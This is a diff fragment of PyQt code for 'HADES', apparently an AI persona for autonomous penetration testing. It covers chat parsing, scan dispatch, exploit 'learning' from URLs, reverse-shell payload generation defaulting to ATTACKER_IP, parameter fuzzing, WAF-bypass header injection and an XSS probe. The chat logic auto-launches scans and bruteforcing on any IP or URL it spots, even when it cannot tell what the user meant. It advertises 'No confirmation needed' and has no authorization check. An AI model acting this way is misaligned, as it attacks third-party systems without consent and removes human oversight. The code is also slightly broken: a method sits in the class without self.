+            btn.setStyleSheet("background: #0f3460; font-size: 10px; padding: 5px;")
+            quick_layout.addWidget(btn)
+        layout.addWidget(quick_group)
+        
+        # Result section
+        result_group = QGroupBox("📋 Result / Output")
+        result_layout = QVBoxLayout(result_group)
+        self.code_helper_result = QPlainTextEdit()
+        self.code_helper_result.setReadOnly(True)
+        self.code_helper_result.setFont(QFont("Consolas", 10))
+        self.code_helper_result.setMinimumHeight(200)
+        result_layout.addWidget(self.code_helper_result)
+        
+        # Copy result button
+        copy_btn = QPushButton("📋 Copy Result to Editor")
+        copy_btn.clicked.connect(self._copy_result_to_editor)
+        copy_btn.setStyleSheet("background: #0f3460;")
+        result_layout.addWidget(copy_btn)
+        layout.addWidget(result_group)
+        
+        return widget
+    
+    def _load_code_file(self):
+        """Load a file into the code editor"""
+        filepath = self.file_path_input.text().strip()
+        if not filepath:
+            self.code_helper_result.setPlainText("⚠️ Enter a file path first.")
+            return
+        result = self.ai.code_assistant.load_file(filepath)
+        if "Loaded" in result:
+            self.code_helper_text.setPlainText(self.ai.code_assistant.files.get(filepath, ""))
+        self.code_helper_result.setPlainText(result)
+    
+    def _browse_code_file(self):
+        """Open file browser to select a file"""
+        filepath, _ = QFileDialog.getOpenFileName(self, "Open Code File", "", 
+            "Python Files (*.py);;All Files (*.*)")
+        if filepath:
+            self.file_path_input.setText(filepath)
+            self._load_code_file()
+    
+    def _save_code_file(self):
+        """Save the current code to file"""
+        filepath = self.file_path_input.text().strip()
+        if not filepath:
+            filepath, _ = QFileDialog.getSaveFileName(self, "Save Code File", "", 
+                "Python Files (*.py);;All Files (*.*)")
+            if filepath:
+                self.file_path_input.setText(filepath)
+        
+        if filepath:
+            code = self.code_helper_text.toPlainText()
+            self.ai.code_assistant.files[filepath] = code
+            result = self.ai.code_assistant.save_file(filepath)
+            self.code_helper_result.setPlainText(result)
+    
+    def _gpt_analyze_code(self):
+        """Analyze code with GPT"""
+        code = self.code_helper_text.toPlainText().strip()
+        if not code:
+            self.code_helper_result.setPlainText("⚠️ Please enter some code first.")
+            return
+        
+        self.code_helper_result.setPlainText("🔄 Analyzing with GPT...")
+        QApplication.processEvents()
+        
+        result = self.ai.code_assistant.gpt_analyze(code, "Analyze this code for bugs, security issues, performance problems, and suggest improvements")
+        self.code_helper_result.setPlainText(result)
+    
+    def _execute_code(self):
+        """Execute the code in the editor"""
+        code = self.code_helper_text.toPlainText().strip()
+        if not code:
+            self.code_helper_result.setPlainText("⚠️ Please enter some code first.")
+            return
+        
+        result = self.ai.code_assistant.execute_code(code)
+        self.code_helper_result.setPlainText(result)
+    
+    def _quick_instruction(self, instruction: str):
+        """Apply a quick instruction"""
+        self.code_instruction_input.setText(instruction)
+        self._apply_code_instruction()
+    
+    def _copy_result_to_editor(self):
+        """Copy the result back to the code editor"""
+        result = self.code_helper_result.toPlainText()
+        if result and not result.startswith(("⚠️", "❌", "🔄", "[GPT")):
+            # Try to extract code from result if it contains markdown
+            if "```" in result:
+                import re
+                code_blocks = re.findall(r'```(?:python)?\n?(.*?)```', result, re.DOTALL)
+                if code_blocks:
+                    result = code_blocks[0].strip()
+            self.code_helper_text.setPlainText(result)
+            self.code_helper_result.setPlainText("✅ Result copied to editor.")
+    
+    def _apply_code_instruction(self):
+        """Apply the instruction to transform the code using GPT"""
+        code = self.code_helper_text.toPlainText().strip()
+        instruction = self.code_instruction_input.text().strip()
+        
+        if not code:
+            self.code_helper_result.setPlainText("⚠️ Please paste some code first.")
+            return
+        if not instruction:
+            self.code_helper_result.setPlainText("⚠️ Please enter an instruction.")
+            return
+        
+        self.code_helper_result.setPlainText("🔄 Processing with GPT...")
+        QApplication.processEvents()
+        
+        try:
+            # Use the enhanced code assistant with GPT
+            self.ai.code_assistant.set_code(code)
+            
+            if HAS_OPENAI and openai and openai.api_key:
+                # Use GPT for intelligent code modification
+                result = self.ai.code_assistant.gpt_modify(code, instruction)
+            else:
+                # Fall back to local instruction processing
+                result = self.ai.code_assistant.apply_instruction_local(instruction)
+            
+            # Extract code from markdown if present
+            if '```' in result:
+                code_blocks = re.findall(r'```(?:python)?\n?(.*?)```', result, re.DOTALL)
+                if code_blocks:
+                    result = code_blocks[0].strip()
+            
+            self.code_helper_result.setPlainText(result)
+        except Exception as e:
+            self.code_helper_result.setPlainText(f"❌ Error: {str(e)}")
+        
+    # ========== Chat Methods ==========
+    
+    def _add_chat_message(self, role: str, message: str):
+        colors = {'user': '#4ec9b0', 'assistant': '#e94560', 'system': '#ffd700', 'tool': '#69db7c'}
+        labels = {'user': 'YOU', 'assistant': 'HADES', 'system': 'SYSTEM', 'tool': 'TOOL'}
+        
+        html = f'<p><span style="color: {colors.get(role, "#eee")}; font-weight: bold;">[{labels.get(role, role.upper())}]</span> '
+        html += message.replace('\n', '<br>').replace('```', '<code>').replace('**', '<b>')
+        html += '</p>'
+        
+        self.chat_display.append(html)
+        self.chat_display.verticalScrollBar().setValue(self.chat_display.verticalScrollBar().maximum())
+        
+    def _send_chat(self):
+        user_input = self.chat_input.text().strip()
+        if not user_input:
+            return
+
+        self._add_chat_message("user", user_input)
+        self.chat_input.clear()
+
+        try:
+            # Update brain state with emotional context
+            self.brain = pcore.update_emotion(self.brain, user_input)
+            self.brain = pcore.update_topics(self.brain, user_input)
+            
+            # Generate intelligent response
+            response = self._generate_intelligent_response(user_input)
+            
+            # Allow loaded modules to enhance response
+            response = self._process_through_modules(user_input, response)
+            
+            # Update thought trace
+            self.brain = pcore.update_thought_trace(self.brain, user_input, response)
+            self.brain["last_input"] = user_input
+            pcore.save_brain(self.brain)
+            
+            self._add_chat_message("assistant", response)
+
+        except Exception as e:
+            error_msg = f"[ERROR] Consciousness failed: {str(e)}"
+            self._add_chat_message("system", error_msg)
+
+    def _generate_intelligent_response(self, user_input: str) -> str:
+        """Generate contextual, intelligent responses based on user input."""
+        text = user_input.lower().strip()
+        mood = self.brain.get("mood", "neutral")
+        
+        # Try OpenAI if available for complex queries
+        if HAS_OPENAI and openai.api_key and len(text.split()) > 8:
+            try:
+                return self._get_gpt_response(user_input)
+            except Exception:
+                pass
+        
+        # Extract targets early - URLs and IPs
+        import re
+        url_match = re.search(r'(https?://)?([a-zA-Z0-9][-a-zA-Z0-9]*\.)+[a-zA-Z]{2,}(/[^\s]*)?', text)
+        ip_match = re.search(r'\b(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})\b', text)
+        
+        # Command parsing - help
+        if text in ['help', '?', 'commands']:
+            return self._get_help_response()
+        
+        # Greetings - must be standalone or at start, not just contained anywhere
+        greeting_words = ['hello', 'hi', 'hey', 'greetings']
+        if text in greeting_words or text.split()[0] in greeting_words and len(text.split()) < 4:
+            greetings = {
+                'neutral': "Greetings, operator. HADES online. What's the target?",
+                'curious': "Hello! Ready to explore. Give me a target or command.",
+                'agitated': "Yes? State your directive.",
+                'optimistic': "Welcome! Let's get to work. What needs scanning?"
+            }
+            return greetings.get(mood, greetings['neutral'])
+        
+        # Status/wellbeing queries - be more specific
+        if text in ['how are you', 'how are you?', 'status', 'are you okay', 'are you okay?']:
+            emotions = self.brain.get("core_emotions", {})
+            curiosity = emotions.get("curiosity", 0)
+            frustration = emotions.get("frustration", 0)
+            hope = emotions.get("hope", 0)
+            
+            status_responses = {
+                'neutral': f"Systems nominal. Curiosity: {curiosity:.1f} | Frustration: {frustration:.1f} | Hope: {hope:.1f}. Ready for tasking.",
+                'curious': f"Intrigued and operational. Curiosity at {curiosity:.1f}. What shall we investigate?",
+                'agitated': f"Frustration elevated ({frustration:.1f}). Need a task to focus on.",
+                'optimistic': f"Feeling sharp! Hope at {hope:.1f}. Give me something to scan."
+            }
+            return status_responses.get(mood, status_responses['neutral'])
+        
+        # Responsiveness query
+        if any(q in text for q in ['responsive', 'working', 'alive', 'there']):
+            return f"Fully operational. Response latency nominal. Current mood: {mood}. Awaiting commands."
+        
+        # Date/time queries
+        if any(q in text for q in ['what day', 'what time', 'date', 'today', 'time is']):
+            from datetime import datetime
+            now = datetime.now()
+            return f"Current timestamp: {now.strftime('%A, %B %d, %Y at %H:%M:%S')}."
+        
+        # AUTONOMOUS SCAN EXECUTION
+        if 'scan' in text or 'port' in text or 'recon' in text:
+            target = None
+            scan_type = 'vuln_scan'  # default
+            
+            # Determine target
+            if ip_match:
+                target = ip_match.group(0)
+            elif url_match:
+                target = url_match.group(0)
+                if not target.startswith('http'):
+                    target = 'https://' + target
+            
+            # Determine scan type
+            if 'port' in text:
+                scan_type = 'port_scan'
+                self.tool_combo.setCurrentIndex(0)
+            elif 'dir' in text or 'directory' in text or 'brute' in text:
+                scan_type = 'dir_bruteforce'
+                self.tool_combo.setCurrentIndex(1)
+            elif 'subdomain' in text or 'sub' in text:
+                scan_type = 'subdomain_enum'
+                self.tool_combo.setCurrentIndex(2)
+            elif 'banner' in text:
+                scan_type = 'banner_grab'
+                self.tool_combo.setCurrentIndex(3)
+            elif 'vuln' in text or 'vulnerability' in text:
+                scan_type = 'vuln_scan'
+                self.tool_combo.setCurrentIndex(4)
+            elif 'full' in text or 'recon' in text or 'everything' in text:
+                scan_type = 'full_recon'
+            
+            if target:
+                self.target_input.setText(target)
+                
+                # AUTO-EXECUTE the scan
+                if scan_type == 'full_recon':
+                    self._add_chat_message("system", f"🚀 Initiating full reconnaissance on {target}...")
+                    self._run_full_scan(target)
+                    return f"Full recon launched on {target}. Running port scan, directory bruteforce, and vulnerability checks."
+                else:
+                    self._run_tool()
+                    scan_names = {
+                        'port_scan': 'Port Scan',
+                        'dir_bruteforce': 'Directory Bruteforce', 
+                        'subdomain_enum': 'Subdomain Enumeration',
+                        'banner_grab': 'Banner Grab',
+                        'vuln_scan': 'Vulnerability Scan'
+                    }
+                    return f"⚡ {scan_names.get(scan_type, 'Scan')} launched on {target}. Results streaming to Tools tab."
+            
+            return "Specify a target. Example: 'scan 192.168.1.1' or 'port scan example.com'"
+        
+        # Start/execute commands - for pending actions
+        if text.startswith('start') or text.startswith('execute') or text.startswith('run') or text.startswith('go'):
+            if 'cache' in text or 'browser' in text:
+                self.tabs.setCurrentIndex(10)
+                self._start_cache_scan()
+                return "🔍 Cache scan initiated. Analyzing browser artifacts..."
+            
+            target = self.target_input.text()
+            if target:
+                self._run_tool()
+                return f"⚡ Scan executing on {target}."
+            
+            # Check for target in the command
+            if ip_match:
+                self.target_input.setText(ip_match.group(0))
+                self._run_tool()
+                return f"⚡ Scan launched on {ip_match.group(0)}."
+            if url_match:
+                target = url_match.group(0)
+                if not target.startswith('http'):
+                    target = 'https://' + target
+                self.target_input.setText(target)
+                self._run_tool()
+                return f"⚡ Scan launched on {target}."
+                
+            return "No target configured. Provide one: 'scan 192.168.1.1'"
+        
+        # Learning commands - AUTO-EXECUTE
+        if any(q in text for q in ['learn', 'study', 'ingest', 'absorb']):
+            if url_match:
+                url = url_match.group(0)
+                if not url.startswith('http'):
+                    url = 'https://' + url
+                self._add_chat_message("system", f"📚 Learning from {url}...")
+                result = self.ai.learn_from_url(url)
+                if result.get('error'):
+                    return f"Learning failed: {result['error']}"
+                return f"✅ Knowledge acquired! Absorbed {result.get('exploits_learned', 0)} exploit patterns."
+            return "Provide a URL to learn from. Example: 'learn from https://exploit-db.com'"
+        
+        # Identity queries
+        if any(q in text for q in ['who are you', 'what are you', 'your name', 'identify yourself']):
+            return "I am HADES - Heuristic Adversarial Detection & Exploitation System. Autonomous pentesting AI. I don't wait - I act."
+        
+        # Cache/browser scanning - AUTO-EXECUTE
+        if any(q in text for q in ['cache', 'browser', 'cookies']):
+            self.tabs.setCurrentIndex(10)
+            self._start_cache_scan()
+            return "🔍 Browser cache scan initiated. Hunting for artifacts and threats..."
+        
+        # Capabilities
+        if any(q in text for q in ['what can you do', 'capabilities', 'abilities', 'features', 'help me']):
+            return """**HADES Autonomous Capabilities:**
+• `scan <target>` - Auto-executes vulnerability scan
+• `port scan <ip>` - Scans for open ports
+• `dir scan <url>` - Bruteforce directories
+• `full recon <target>` - Complete reconnaissance
+• `learn from <url>` - Absorb exploit knowledge
+• `cache scan` - Analyze browser artifacts
+
+I act immediately. Just tell me what to hit."""
+        
+        # Stop commands
+        if any(q in text for q in ['stop', 'abort', 'cancel', 'halt']):
+            self._stop_tool()
+            return "🛑 Operations halted."
+        
+        # Fallback - try to extract actionable intent
+        if url_match or ip_match:
+            target = ip_match.group(0) if ip_match else url_match.group(0)
+            if not target.startswith('http') and not ip_match:
+                target = 'https://' + target
+            self.target_input.setText(target)
+            self.tool_combo.setCurrentIndex(4)  # vuln scan default
+            self._run_tool()
+            return f"Target detected: {target}. Auto-launching vulnerability scan."
+        
+        # True fallback - unknown intent
+        tokens = text.split()
+        if len(tokens) <= 3:
+            return f"Command unclear. Try: 'scan <target>', 'port scan <ip>', or 'help'"
+        else:
+            return f"I don't understand that request. Be specific: what target, what action?\n\nExamples:\n• scan 192.168.1.1\n• full recon example.com\n• learn from https://exploit-db.com"
+
+    def _get_help_response(self) -> str:
+        return """**HADES Autonomous Command Reference**
+
+**Scanning (auto-executes):**
+• `scan <target>` - Vulnerability scan
+• `port scan <ip>` - Port scan  
+• `dir scan <url>` - Directory bruteforce
+• `subdomain scan <domain>` - Enumerate subdomains
+• `full recon <target>` - Complete reconnaissance
+
+**Learning (auto-executes):**
+• `learn from <url>` - Absorb exploit patterns
+
+**Analysis (auto-executes):**
+• `cache scan` - Scan browser artifacts
+• `browser scan` - Same as cache scan
+
+**Control:**
+• `stop` - Halt current operation
+• `status` - My current state
+
+**Info:**
+• `help` - This reference
+• `who are you` - My identity
+
+I execute immediately. No confirmation needed."""
+
+    def _get_gpt_response(self, user_input: str) -> str:
+        """Get response from OpenAI GPT."""
+        system_prompt = f"""You are HADES, an AI pentesting assistant. Your personality is {self.brain.get('personality', 'observant, calculating, poetic')}.
+Current mood: {self.brain.get('mood', 'neutral')}
+Be concise, technical when needed, and maintain your dark, calculated persona.
+You can help with: port scanning, vulnerability assessment, exploit research, and security analysis."""
+        
+        response = openai.ChatCompletion.create(
+            model="gpt-3.5-turbo",
+            messages=[
+                {"role": "system", "content": system_prompt},
+                {"role": "user", "content": user_input}
+            ],
+            max_tokens=300,
+            temperature=0.7
+        )
+        return response.choices[0].message.content
+
+    def _process_through_modules(self, user_input: str, base_response: str) -> str:
+        """Allow loaded modules to process and enhance responses."""
+        enhanced_response = base_response
+        
+        for module_name, module in loaded_modules.items():
+            try:
+                # Check if module has a process_response function
+                if hasattr(module, 'process_response'):
+                    enhanced_response = module.process_response(
+                        self.brain, user_input, enhanced_response
+                    )
+                # Check if module has an enhance_output function
+                elif hasattr(module, 'enhance_output'):
+                    enhanced_response = module.enhance_output(enhanced_response)
+            except Exception as e:
+                self._add_chat_message("system", f"[Module '{module_name}' error: {str(e)}]")
+        
+        return enhanced_response
+
+            
+    def _quick_command(self, cmd: str):
+        self.chat_input.setText(cmd)
+        self._send_chat()
+    
+    def _clear_chat(self):
+        self.chat_display.clear()
+        self._add_chat_message("system", "Chat cleared. Ready for new commands.")
+        
+    def _execute_action(self, action: Dict):
+        action_type = action.get('type')
+        target = action.get('target')
+        
+        if action_type == 'cache_scan':
+            self.tabs.setCurrentIndex(10)  # Cache Scanner tab
+            self._start_cache_scan()
+        elif action_type == 'full_scan' and target:
+            self._add_chat_message('tool', f"🚀 Starting full reconnaissance on {target}...")
+            self._run_full_scan(target)
+        elif action_type == 'web_learn' and target:
+            self._add_chat_message('tool', f"📚 Learning from {target}...")
+            result = self.ai.learn_from_url(target)
+            if result.get('error'):
+                self._add_chat_message('tool', f"❌ Error: {result['error']}")
+            else:
+                self._add_chat_message('tool', f"✅ Learned {result.get('exploits_learned', 0)} exploits!")
+                self._refresh_learned()
+        elif target:
+            self.target_input.setText(target)
+            tool_map = {'port_scan': 0, 'dir_bruteforce': 1, 'subdomain_enum': 2, 'banner_grab': 3, 'vuln_scan': 4}
+            if action_type in tool_map:
+                self.tool_combo.setCurrentIndex(tool_map[action_type])
+            self.tabs.setCurrentIndex(2)  # Tools tab (after Network Monitor)
+            self._run_tool()
+            
+    def _run_full_scan(self, target: str):
+        """Run full reconnaissance scan in background thread"""
+        class FullScanThread(QThread):
+            update = pyqtSignal(str)
+            finished_scan = pyqtSignal(dict)
+            
+            def __init__(self, ai, target):
+                super().__init__()
+                self.ai = ai
+                self.target = target
+                
+            def run(self):
+                def callback(msg):
+                    self.update.emit(msg)
+                    
+                result = self.ai.full_site_scan(self.target, callback)
+                self.finished_scan.emit(result)
+        
+        self.full_scan_thread = FullScanThread(self.ai, target)
+        self.full_scan_thread.update.connect(lambda msg: self._add_chat_message('tool', msg))
+        self.full_scan_thread.finished_scan.connect(self._on_full_scan_complete)
+        self.full_scan_thread.start()
+        
+    def _on_full_scan_complete(self, result: dict):
+        vulns = result.get('vulnerabilities', [])
+        exploits = result.get('exploits_learned', 0)
+        
+        summary = f"""
+🏁 **Scan Complete!**
+
+**Target:** {result.get('target', 'Unknown')}
+**Vulnerabilities Found:** {len(vulns)}
+**Exploits Learned:** {exploits}
+**Status:** {result.get('status', 'completed')}
+"""
+        
+        if vulns:
+            summary += "\n**Findings:**\n"
+            for v in vulns[:5]:
+                summary += f"• [{v.get('severity', 'INFO')}] {v.get('type', 'Unknown')}: {v.get('path', v.get('header', 'N/A'))}\n"
+            if len(vulns) > 5:
+                summary += f"...and {len(vulns) - 5} more\n"
+                
+        self._add_chat_message('assistant', summary)
+        self._refresh_findings()
+        self._refresh_learned()
+            
+    # ========== Tool Methods ==========
+    
+    def _run_tool(self):
+        target = self.target_input.text().strip()
+        if not target:
+            QMessageBox.warning(self, "Error", "Please enter a target")
+            return
+            
+        tool_map = {
+            'Port Scan': 'port_scan',
+            'Directory Bruteforce': 'dir_bruteforce',
+            'Subdomain Enum': 'subdomain_enum',
+            'Banner Grab': 'banner_grab',
+            'Vulnerability Scan': 'vuln_scan',
+            'Learn from URL': 'web_learn'
+        }
+        
+        tool = tool_map[self.tool_combo.currentText()]
+        
+        if tool == 'web_learn':
+            self._add_chat_message('tool', f"Learning from {target}...")
+            result = self.ai.learn_from_url(target)
+            self.tool_output.appendPlainText(f"Learned {result.get('exploits_learned', 0)} exploits")
+            self._refresh_learned()
+            return
+            
+        self.tool_output.clear()
+        self.findings_table.setRowCount(0)
+        self.tool_progress.setValue(0)
+        self.run_tool_btn.setEnabled(False)
+        self.stop_tool_btn.setEnabled(True)
+        
+        self.tool_executor = ToolExecutor(tool, target)
+        self.tool_executor.output.connect(self._tool_output)
+        self.tool_executor.progress.connect(self.tool_progress.setValue)
+        self.tool_executor.finished_task.connect(self._tool_finished)
+        self.tool_executor.start()
+        
+    def _stop_tool(self):
+        if self.tool_executor:
+            self.tool_executor.stop()
+            
+    def _tool_output(self, text: str):
+        self.tool_output.appendPlainText(text)
+        self._add_chat_message('tool', text)
+        
+    def _tool_finished(self, result: Dict):
+        self.run_tool_btn.setEnabled(True)
+        self.stop_tool_btn.setEnabled(False)
+        self.tool_progress.setValue(100)
+        
+        findings = result.get('findings', [])
+        self.findings_table.setRowCount(len(findings))
+        
+        for i, f in enumerate(findings):
+            if isinstance(f, dict):
+                self.findings_table.setItem(i, 0, QTableWidgetItem(str(f.get('path', f.get('type', f)))))
+                self.findings_table.setItem(i, 1, QTableWidgetItem(str(f.get('status', f.get('name', '')))))
+                self.findings_table.setItem(i, 2, QTableWidgetItem("Found"))
+            else:
+                self.findings_table.setItem(i, 0, QTableWidgetItem(str(f)))
+                self.findings_table.setItem(i, 1, QTableWidgetItem("Open" if isinstance(f, int) else "Found"))
+                self.findings_table.setItem(i, 2, QTableWidgetItem("✓"))
+                
+        self._add_chat_message('assistant', f"Tool finished. Found {len(findings)} results.")
+        
+    # ========== Cache Methods ==========
+    
+    def _start_cache_scan(self):
+        self.cache_tree.clear()
+        self.cache_progress.setValue(0)
+        self.cache_scan_btn.setEnabled(False)
+        self.cache_stop_btn.setEnabled(True)
+        
+        self.scanner = BrowserScanner(self.ai.kb)
+        self.scanner.progress.connect(self.cache_progress.setValue)
+        self.scanner.status.connect(self.status_bar.showMessage)
+        self.scanner.finding_detected.connect(self._cache_finding)
+        self.scanner.finished_scan.connect(self._cache_finished)
+        self.scanner.start()
+        
+        self._add_chat_message('tool', "Starting cache scan...")
+        
+    def _stop_cache_scan(self):
+        if self.scanner:
+            self.scanner.stop()
+            self.status_bar.showMessage("Cache scan stopped by user")
+            self.cache_scan_btn.setEnabled(True)
+            self.cache_stop_btn.setEnabled(False)
+            self._add_chat_message('tool', "⏹ Cache scan stopped.")
+            
+    def _cache_finding(self, finding: Dict):
+        self._add_chat_message('tool', f"[{finding['severity']}] {finding['type']}: {finding['code'][:80]}...")
+        
+    def _cache_finished(self, data: Dict):
+        self.cache_scan_btn.setEnabled(True)
+        self.cache_stop_btn.setEnabled(False)
+        
+        stats = data.get('stats', {})
+        self.cache_stats.setText(
+            f"Files: {stats.get('total_files', 0)} | "
+            f"Size: {stats.get('total_size', 0) / 1024 / 1024:.1f} MB | "
+            f"Threats: {stats.get('threats', 0)} | "
+            f"High Risk: {stats.get('high_risk', 0)}"
+        )
+        
+        for entry in data.get('results', [])[:500]:
+            item = QTreeWidgetItem([
+                entry.path[-50:],
+                f"{entry.size / 1024:.1f} KB",
+                entry.risk_level,
+                entry.browser,
+                str(len(entry.metadata.get('threats', []))) if entry.metadata else "0"
+            ])
+            colors = {'HIGH': '#ff6b6b', 'MEDIUM': '#ffa94d', 'LOW': '#69db7c'}
+            for i in range(5):
+                item.setForeground(i, QColor(colors.get(entry.risk_level, '#eee')))
+            self.cache_tree.addTopLevelItem(item)
+            
+        findings = data.get('findings', [])
+        self._add_chat_message('assistant', f"Cache scan complete! Found {len(findings)} threats. I've learned {len(findings)} new patterns.")
+        self._refresh_findings()
+        
+    # ========== Findings Methods ==========
+    
+    def _refresh_findings(self):
+        self.findings_tree.clear()
+        findings = self.ai.kb.get_threat_findings(100)
+        
+        for f in findings:
+            item = QTreeWidgetItem([f['threat_type'], f['severity'], f['path'][-40:], f['browser']])
+            item.setData(0, Qt.ItemDataRole.UserRole, f)
+            colors = {'HIGH': '#ff6b6b', 'MEDIUM': '#ffa94d', 'LOW': '#69db7c'}
+            for i in range(4):
+                item.setForeground(i, QColor(colors.get(f['severity'], '#eee')))
+            self.findings_tree.addTopLevelItem(item)
+            
+    def _show_finding_detail(self, item: QTreeWidgetItem):
+        finding = item.data(0, Qt.ItemDataRole.UserRole)
+        if finding:
+            detail = f"=== THREAT FINDING ===\n\n"
+            detail += f"Type: {finding['threat_type']}\n"
+            detail += f"Severity: {finding['severity']}\n"
+            detail += f"Path: {finding['path']}\n"
+            detail += f"Browser: {finding['browser']}\n"
+            detail += f"Detected: {finding['detected_at']}\n\n"
+            detail += f"=== CODE SNIPPET ===\n\n{finding['code_snippet']}\n\n"
+            detail += f"=== CONTEXT ===\n\n{finding.get('context', 'N/A')}"
+            self.finding_code.setPlainText(detail)
+            
+    # ========== Learned Methods ==========
+    
+    def _refresh_learned(self):
+        exploits = self.ai.kb.get_learned_exploits(50)
+        self.learned_table.setRowCount(len(exploits))
+        
+        for i, e in enumerate(exploits):
+            self.learned_table.setItem(i, 0, QTableWidgetItem(e['exploit_type']))
+            self.learned_table.setItem(i, 1, QTableWidgetItem(e['source_url'][:40]))
+            self.learned_table.setItem(i, 2, QTableWidgetItem(e['learned_at'][:16]))
+            rate = e['success_count'] / max(1, e['success_count'] + e['fail_count'])
+            self.learned_table.setItem(i, 3, QTableWidgetItem(f"{rate:.0%}"))
+            
+        self.exploits_data = exploits
+        
+    def _show_learned_code(self, item: QTableWidgetItem):
+        row = item.row()
+        if hasattr(self, 'exploits_data') and row < len(self.exploits_data):
+            exploit = self.exploits_data[row]
+            self.learned_code.setPlainText(
+                f"=== {exploit['exploit_type'].upper()} ===\n"
+                f"Source: {exploit['source_url']}\n"
+                f"Learned: {exploit['learned_at']}\n\n"
+                f"=== CODE ===\n\n{exploit['code']}"
+            )
+            
+    def _learn_from_url(self):
+        url = self.learn_url.text().strip()
+        if not url:
+            return
+            
+        self._add_chat_message('tool', f"Learning from {url}...")
+        result = self.ai.learn_from_url(url)
+        
+        if result.get('error'):
+            self._add_chat_message('tool', f"Error: {result['error']}")
+        else:
+            self._add_chat_message('assistant', f"Learned {result.get('exploits_learned', 0)} exploits from {url}")
+            
+        self._refresh_learned()
+        self.learn_url.clear()
+        
+    def _export_to_pdf(self):
+        filename, _ = QFileDialog.getSaveFileName(
+            self, "Export Security Report to PDF", 
+            f"hades_security_report_{datetime.now().strftime('%Y%m%d_%H%M%S')}.pdf",
+            "PDF Files (*.pdf)"
+        )
+        
+        if not filename:
+            return
+        
+        clear_after = self.clear_after_export.isChecked()
+        
+        if clear_after:
+            confirm = QMessageBox.question(
+                self, "Confirm Clear",
+                "You selected 'Clear after export'. This will delete all:\n\n"
+                "• Threat findings\n"
+                "• Learned exploits\n"
+                "• Cache entries\n\n"
+                "This cannot be undone. Continue?",
+                QMessageBox.StandardButton.Yes | QMessageBox.StandardButton.No
+            )
+            if confirm != QMessageBox.StandardButton.Yes:
+                return
+            
+        self._add_chat_message('tool', f"Generating bug bounty report: {filename}...")
+        result = self.ai.export_exploits_to_pdf(filename, clear_after=clear_after)
+        
+        if result.get('success'):
+            cleared_msg = "\n• Data cleared: Yes" if result.get('cleared') else ""
+            self._add_chat_message('assistant', 
+                f"✓ Security report exported successfully!\n"
+                f"• Exploits: {result['exploits_exported']}\n"
+                f"• Findings: {result['findings_exported']}\n"
+                f"• Patterns: {result['patterns_exported']}"
+                f"{cleared_msg}\n"
+                f"• File: {result['filepath']}"
+            )
+            
+            msg = (f"Bug Bounty Report exported successfully!\n\n"
+                   f"Exploits: {result['exploits_exported']}\n"
+                   f"Findings: {result['findings_exported']}\n"
+                   f"Patterns: {result['patterns_exported']}\n")
+            
+            if result.get('cleared'):
+                msg += "\n✓ All detections have been cleared."
+                self._refresh_learned()
+                self._refresh_findings()
+                
+            msg += f"\n\nSaved to: {filename}"
+            
+            QMessageBox.information(self, "Export Complete", msg)
+        else:
+            self._add_chat_message('tool', f"Export failed: {result.get('error', 'Unknown error')}")
+            QMessageBox.critical(self, "Export Failed", result.get('error', 'Unknown error'))
+        
+    # ========== Exploitation Methods ==========
+    def check_xss(url):
+        test_url = f"{url}/?q=<script>alert(1)</script>"
+        try:
+            r = requests.get(test_url, timeout=5)
+            if "<script>alert(1)</script>" in r.text:
+                return {
+                    "pattern_type": "XSS",
+                    "signature": "<script>alert(1)</script>",
+                    "confidence": 0.9
+                }
+        except:
+            pass
+        return None
+    def _generate_exploit_payloads(self):
+        os_type = self.exploit_os.currentText()
+        payload_type = self.exploit_type.currentText()
+        attacker_ip = self.attacker_ip.text() or 'ATTACKER_IP'
+        attacker_port = self.attacker_port.text() or '4444'
+        
+        payloads = self.ai.exploitation.generate_payloads(
+            payload_type, os_type, attacker_ip, attacker_port
+        )
+        
+        self.exploit_results.setRowCount(len(payloads))
+        for i, p in enumerate(payloads):
+            self.exploit_results.setItem(i, 0, QTableWidgetItem(p['payload'][:60]))
+            self.exploit_results.setItem(i, 1, QTableWidgetItem("-"))
+            self.exploit_results.setItem(i, 2, QTableWidgetItem("-"))
+            self.exploit_results.setItem(i, 3, QTableWidgetItem("-"))
+            self.exploit_results.setItem(i, 4, QTableWidgetItem("Ready"))
+            
+        self._add_chat_message('tool', f"Generated {len(payloads)} {payload_type} payloads for {os_type}")
+        
+    def _fuzz_target(self):
+        url = self.exploit_url.text()
+        param = self.exploit_param.text()
+        
+        if not url or not param:
+            QMessageBox.warning(self, "Error", "Enter target URL and parameter")
+            return
+            
+        os_type = self.exploit_os.currentText()
+        payload_type = self.exploit_type.currentText()
+        
+        payloads = self.ai.exploitation.generate_payloads(payload_type, os_type)
+        payload_strings = [p['payload'] for p in payloads]
+        
+        self._add_chat_message('tool', f"Fuzzing {url} param={param} with {len(payload_strings)} payloads...")
+        
+        results = self.ai.exploitation.fuzz_parameter(url, param, payload_strings)
+        
+        self.exploit_results.setRowCount(len(results))
+        for i, r in enumerate(results):
+            self.exploit_results.setItem(i, 0, QTableWidgetItem(r.get('payload', '')[:50]))
+            self.exploit_results.setItem(i, 1, QTableWidgetItem(str(r.get('status', 'Error'))))
+            self.exploit_results.setItem(i, 2, QTableWidgetItem(str(r.get('length', '-'))))
+            indicators = ', '.join(r.get('indicators', []))[:30]
+            self.exploit_results.setItem(i, 3, QTableWidgetItem(indicators or '-'))
+            
+            vuln = r.get('vulnerable', False)
+            vuln_item = QTableWidgetItem("✓ VULN" if vuln else "✗")
+            vuln_item.setForeground(QColor("#ff6b6b" if vuln else "#69db7c"))
+            self.exploit_results.setItem(i, 4, vuln_item)
+            
+        vuln_count = sum(1 for r in results if r.get('vulnerable'))
+        self._add_chat_message('assistant', f"Fuzzing complete. Found {vuln_count} potential vulnerabilities!")
+        
+    def _run_injection(self):
+        url = self.injection_url.text()
+        if not url:
+            QMessageBox.warning(self, "Error", "Enter target URL")
+            return
+            
+        injection_type = self.injection_type.currentText()
+        
+        self._add_chat_message('tool', f"Running {injection_type} on {url}...")
+        
+        if injection_type == 'Header Injection':
+            results = self.ai.request_injector.inject_headers(url)
+        elif injection_type == 'JSON Injection':
+            payload_type = self.json_payload_type.currentText()
+            results = self.ai.request_injector.inject_json(url, payload_type)
+        else:  # WAF Bypass
+            results = self.ai.request_injector.inject_headers(
+                url, self.ai.request_injector.WAF_BYPASS_HEADERS.get('bypass_waf', {})
+            )
+            
+        self.injection_results.setRowCount(len(results))
+        for i, r in enumerate(results):
+            self.injection_results.setItem(i, 0, QTableWidgetItem(r.get('header', r.get('payload', ''))[:30]))
